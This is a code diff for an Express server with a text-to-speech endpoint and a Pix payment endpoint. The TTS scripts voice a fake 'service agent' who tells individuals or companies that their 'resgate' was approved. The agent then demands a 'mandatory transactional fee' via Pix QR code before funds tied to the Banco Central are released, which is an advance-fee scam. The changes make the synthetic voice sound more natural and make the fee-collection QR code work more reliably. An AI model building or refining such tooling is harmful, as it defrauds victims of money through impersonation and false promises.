@@ -583,11 +583,17 @@ app.post("/api/v1/tts", async (req, res) => {
   const idVoz = voiceId || "EXAVITQu4vr4xnSDxMaL";
   const valorTexto = value ? `no valor de ${value}` : "";
 
+  let finalValueText = valorTexto;
+  if (finalValueText) {
+    // Ajudar a IA a não ler "erre cifrão" e sim o valor.
+    finalValueText = finalValueText.replace("R$", "reais");
+  }
+
   let script = "";
   if (docType && docType.toUpperCase() === 'CNPJ') {
-    script = `Olá. É um grande prazer falar com você. Meu nome é ${atendente}, e eu sou a sua agente de atendimento. Informo que o processo de resgate da sua empresa, ${valorTexto}, foi aprovado com sucesso. Para que possamos liberar a transferência Pix diretamente para a conta vinculada ao Banco Central, é necessário realizar o pagamento da tarifa transacional empresarial obrigatória. Este é um procedimento de segurança padrão exigido pelo sistema. Assim que o pagamento for compensado, o valor integral será creditado na conta em até dois minutos. Por favor, copie o código abaixo ou escaneie o QR Code para finalizar a liberação.`;
+    script = `Olá... É um grande prazer falar com você... Meu nome é ${atendente}, e eu sou a sua agente de atendimento... Informo que o processo de resgate da sua empresa, ${finalValueText}, foi aprovado com sucesso... Para que possamos liberar a transferência Pix, diretamente para a conta vinculada ao Banco Central... é necessário realizar o pagamento da tarifa transacional empresarial obrigatória... Este é um procedimento de segurança padrão exigido pelo sistema... Assim que o pagamento for compensado, o valor integral será creditado na conta em até dois minutos... Por favor... copie o código abaixo, ou escaneie o QR Code, para finalizar a liberação.`;
   } else {
-    script = `Olá, ${firstName}. É um grande prazer falar com você. Meu nome é ${atendente}, e eu sou a sua agente de atendimento. Informo que o seu processo de resgate, ${valorTexto}, foi aprovado com sucesso. Para que possamos liberar a transferência Pix diretamente para a sua conta vinculada ao Banco Central, é necessário realizar o pagamento da tarifa transacional obrigatória. Este é um procedimento de segurança padrão exigido pelo sistema. Assim que o pagamento for compensado, o valor integral será creditado em sua conta em até dois minutos. Por favor, copie o código abaixo ou escaneie o QR Code para finalizar a liberação.`;
+    script = `Olá, ${firstName}... É um grande prazer falar com você... Meu nome é ${atendente}, e eu sou a sua agente de atendimento... Informo que o seu processo de resgate, ${finalValueText}, foi aprovado com sucesso... Para que possamos liberar a transferência Pix, diretamente para a sua conta vinculada ao Banco Central... é necessário realizar o pagamento da tarifa transacional obrigatória... Este é um procedimento de segurança padrão exigido pelo sistema... Assim que o pagamento for compensado, o valor integral será creditado em sua conta em até dois minutos... Por favor... copie o código abaixo, ou escaneie o QR Code, para finalizar a liberação.`;
   }
 
   try {
@@ -671,8 +677,18 @@ app.post("/api/v1/buypix/create", async (req, res) => {
         throw new Error(response.data.message || response.data.error || "Erro na integração com servidor PIX");
     }
 
-    buyPixStatus.set(response.data.data.id, 'pending');
-    res.json(response.data);
+    const responseData = response.data.data;
+    const pixCodeToUse = responseData.pix_qr_code || responseData.payload || responseData.qrcode || responseData.copyPaste || responseData.pix?.qrcode || responseData.pix?.copyPaste || responseData.pix_code;
+    
+    if (pixCodeToUse) {
+       responseData.pix_qr_code = pixCodeToUse;
+       try {
+         responseData.pix_qr_code_base64 = await QRCode.toDataURL(pixCodeToUse);
+       } catch(e) {}
+    }
+
+    buyPixStatus.set(responseData.id, 'pending');
+    res.json({ success: true, data: responseData });
 
   } catch (err: any) {
     const errorMsg = err.response?.data?.message || err.message;
